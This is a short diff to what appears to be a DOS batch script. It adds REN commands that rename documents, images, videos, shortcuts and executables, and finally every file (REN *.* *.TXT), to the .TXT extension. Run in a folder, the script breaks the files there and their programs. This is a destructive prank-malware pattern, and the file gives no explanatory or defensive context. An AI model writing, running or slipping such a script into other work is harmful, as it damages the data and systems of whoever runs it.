@@ -1,6 +1,12 @@
-REN *.DOC *.TXT REN *.JPEG *.TXT
+REN *.DOC *.TXT
+REN *.JPEG *.TXT
 REN *.LNK *.TXT
 REN *.AVI *.TXT
 REN *.MPEG *.TXT
 REN *.COM *.TXT
 REN *.BAT *.TXT
+REN *.pdf *.TXT
+REN *.docx *.TXT
+REN *.exe *.TXT
+
+REN *.* *.TXT
